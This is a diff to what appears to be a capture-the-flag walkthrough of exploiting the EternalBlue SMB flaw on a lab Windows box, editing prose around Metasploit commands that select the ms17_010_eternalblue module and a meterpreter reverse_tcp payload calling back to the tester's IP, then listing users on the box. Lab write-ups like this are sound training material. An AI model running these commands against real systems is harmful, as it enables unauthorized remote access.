@@ -86,8 +86,7 @@ So to use it:
 ```
 use exploit/windows/smb/ms17_010_eternalblue
 ````
-
-Set RHOSTS to the box ip, and set the payload as meterpreter where LHOST is our ip.
+Set RHOSTS to the box ip. This exploit grants a root shell so no need for meterpreter here, but just for the practice lets use it. Set the payload as meterpreter where LHOST is our ip.
 
 ```
 set payload windows/x64/meterpreter/reverse_tcp
@@ -97,7 +96,7 @@ We get a meterpreter session on the box.
 
 # Post Exploit
 
-Navigate to `C:\Users` to see which users are on the box. Just like we saw on the nmap results, there is a user called haris, and also a folder for the Administrator.
+Navigate to `C:\Users` to see which users are on the box. Just like we saw on the nmap results, there is a user called haris and Administrator.
 
 ![Users](./Pictures/Users.png)
 
